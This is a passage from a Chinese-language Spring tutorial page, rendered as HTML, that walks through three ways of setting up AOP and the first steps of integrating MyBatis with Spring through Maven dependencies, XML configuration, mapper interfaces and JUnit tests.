class="line">       <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;log&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">aop:advisor</span> <span class="attr">advice-ref</span>=<span class="string">&quot;afterLog&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;pointcut&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyTest</span> &#123;</span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;beans.xml&quot;</span>);</span><br><span class="line">       <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> (UserService) context.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line">       userService.select();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>Aop的重要性 : 很重要 . 一定要理解其中的思路 , 主要是思想的理解这一块 .</p><p>**Spring的Aop就是将公共的业务 (日志 , 安全等) 和领域业务结合起来 , 当执行领域业务时 , 将会把公共业务加进来 . 实现公共业务的重复利用 . 领域业务更纯粹 , 程序猿专注领域业务 , 其本质还是动态代理 . **</p><p>方式二：自定义来实现【主要是切面定义】</p><p>目标业务类不变依旧是userServiceImpl</p><ol><li><p>写我们自己的一个切入类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DiyPointCut</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==========方法执行前============&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==========方法执行后============&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>去spring中配置</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--方式二：自定义类--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--注册bean--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;diy&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.diy.DiyPointCut&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--aop的配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:config</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--自定义切面，ref要引用的类--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">aop:aspect</span> <span class="attr">ref</span>=<span class="string">&quot;diy&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--切入点--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:pointcut</span> <span class="attr">id</span>=<span class="string">&quot;point&quot;</span> <span class="attr">expression</span>=<span class="string">&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:before</span> <span class="attr">method</span>=<span class="string">&quot;before&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;point&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">aop:after</span> <span class="attr">method</span>=<span class="string">&quot;after&quot;</span> <span class="attr">pointcut-ref</span>=<span class="string">&quot;point&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--通知--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">aop:aspect</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">aop:config</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>测试：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">UserService</span> <span class="variable">userService</span> <span class="operator">=</span> (UserService)context.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line"></span><br><span class="line">    userService.add();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><p>方式三：使用注解实现！</p><ol><li><p>编写一个注解实现的增强类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//方式三：使用注解的方式实现AOP</span></span><br><span class="line"><span class="meta">@Aspect</span><span class="comment">//标注这个类是一个切面</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AnnotationPointCut</span> &#123;</span><br><span class="line">    <span class="meta">@Before(&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">before</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==========方法执行前============&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@After(&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">after</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==========方法执行后============&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//在环绕增强中，我们可以给定一个参数，代表我们要获取处理切入的点</span></span><br><span class="line">    <span class="meta">@Around(&quot;execution(* nuc.ss.service.UserServiceImpl.*(..))&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">around</span><span class="params">(ProceedingJoinPoint jp)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;==========环绕前============&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取签名</span></span><br><span class="line">        <span class="comment">//Signature signature = jp.getSignature();</span></span><br><span class="line">        <span class="comment">//System.out.println(&quot;signature:&quot; + signature);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行方法</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">proceed</span> <span class="operator">=</span> jp.proceed();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;==========环绕后============&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>在Spring配置文件中，注册bean，并增加支持注解的配置</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--方式三：注解--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;annotationPointCut&quot;</span> <span class="attr">class</span>=<span class="string">&quot;nuc.ss.diy.AnnotationPointCut&quot;</span>/&gt;</span></span><br><span class="line"><span class="comment">&lt;!--开启注解支持: JDK（默认proxy-target-class=&quot;false&quot;） cglib--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">aop:aspectj-autoproxy</span> <span class="attr">proxy-target-class</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure></div></li></ol><h2 id="12、整合Mybatis"><a href="#12、整合Mybatis" class="headerlink" title="12、整合Mybatis"></a>12、整合Mybatis</h2><p>步骤：</p><ol><li><p>导入相关jar包</p><ul><li><p>junit</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>mybatis</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>mysql数据库：mysql-connector-java</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.47<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>spring相关的：spring-webmvc</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.10.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>aspectJ AOP 织入器</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>mybatis-spring整合包【重点】</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependecy</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>配置Maven静态资源过滤问题！</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.properties<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">filtering</span>&gt;</span>true<span class="tag">&lt;/<span class="name">filtering</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li></ul></li><li><p>编写配置文件</p></li><li><p>测试</p></li></ol><h3 id="12-1、回忆mybatis"><a href="#12-1、回忆mybatis" class="headerlink" title="12.1、回忆mybatis"></a>12.1、回忆mybatis</h3><ol><li><p>编写实体类</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> nuc.ss.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String pwd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>编写核心配置文件</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">configuration</span></span></span><br><span class="line"><span class="meta">       <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">       <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">typeAliases</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;nuc.ss.pojo&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">typeAliases</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">environments</span> <span class="attr">default</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">environment</span> <span class="attr">id</span>=<span class="string">&quot;development&quot;</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">transactionManager</span> <span class="attr">type</span>=<span class="string">&quot;JDBC&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">type</span>=<span class="string">&quot;POOLED&quot;</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf8&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span></span><br><span class="line">           <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">environment</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">environments</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">mappers</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;nuc.ss.dao&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">mappers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>编写接口</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">selectUser</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>编写Mapper.xml</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">mapper</span></span></span><br><span class="line"><span class="meta">       <span class="keyword">PUBLIC</span> <span class="string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">       <span class="string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mapper</span> <span class="attr">namespace</span>=<span class="string">&quot;nuc.ss.dao.UserMapper&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;selectUser&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;User&quot;</span>&gt;</span></span><br><span class="line">    select * from user</span><br><span class="line">   <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">mapper</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>测试</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">selectUser</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">   <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> <span class="string">&quot;mybatis-config.xml&quot;</span>;</span><br><span class="line">   <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Resources.getResourceAsStream(resource);</span><br><span class="line">   <span class="type">SqlSessionFactory</span> <span class="variable">sqlSessionFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SqlSessionFactoryBuilder</span>().build(inputStream);</span><br><span class="line">   <span class="type">SqlSession</span> <span class="variable">sqlSession</span> <span class="operator">=</span> sqlSessionFactory.openSession();</span><br><span class="line"></span><br><span class="line">   <span class="type">UserMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> sqlSession.getMapper(UserMapper.class);</span><br><span class="line"></span><br><span class="line">   List&lt;User&gt; userList = mapper.selectUser();</span><br><span class="line">   <span class="keyword">for</span> (User user: userList)&#123;</span><br><span class="line">       System.out.println(user);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   sqlSession.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><h3 id="12-2、Mybatis-Spring"><a href="#12-2、Mybatis-Spring" class="headerlink" title="12.2、Mybatis-Spring"></a>12.2、Mybatis-Spring</h3><p>引入Spring之前需要了解mybatis-spring包中的一些重要类；</p><p><a class="link"   href="http://www.mybatis.org/spring/zh/index.html" >mybatis-spring官网 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/spring%E8%AF%BE%E5%A0%82%E7%AC%94%E8%AE%B0.assets/13.png"                      alt="1078856-20170205160357354-490660449"                ></p><p><strong>什么是 MyBatis-Spring？</strong></p><p>MyBatis-Spring 会帮助你将 MyBatis 代码无缝地整合到 Spring 中。</p><p><strong>知识基础</strong></p><p>在开始使用 MyBatis-Spring 之前，你需要先熟悉 Spring 和 MyBatis 这两个框架和有关它们的术语。这很重要</p><p>MyBatis-Spring 需要以下版本：</p><table><thead><tr><th align="center">MyBatis-Spring</th><th align="center">MyBatis</th><th align="center">Spring 框架</th><th align="center">Spring Batch</th><th align="center">Java</th></tr></thead><tbody><tr><td align="center">2.0</td><td align="center">3.5+</td><td align="center">5.0+</td><td align="center">4.0+</td><td align="center">Java 8+</td></tr><tr><td align="center">1.3</td><td align="center">3.4+</td><td align="center">3.2.2+</td><td align="center">2.1+</td><td align="center">Java 6+</td></tr></tbody></table><p>如果使用 Maven 作为构建工具，仅需要在 pom.xml 中加入以下代码即可：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.0.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p><strong>整合方式一</strong></p><ol><li><p>引入配置文件</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">      <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">       http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>编写数据源配置</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置数据源：数据源有非常多，可以使用第三方的，也可使使用Spring的--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/mybatis?useSSL=true<span class="symbol">&amp;amp;</span>useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf8&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>sqlSessionFactory</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--配置SqlSessionFactory--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;dataSource&quot;</span>/&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--关联Mybatis--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;configLocation&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:mybatis-config.xml&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;mapperLocations&quot;</span> <span class="attr">value</span>=<span class="string">&quot;classpath:nuc/ss/dao/*.xml&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>sqlSessionTemplate</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--注册sqlSessionTemplate , 关联sqlSessionFactory--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSession&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionTemplate&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!--利用构造器注入,没有set注入，只能使用构造器注入--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;sqlSessionFactory&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li><li><p>需要给接口加实现类【新加的】</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title 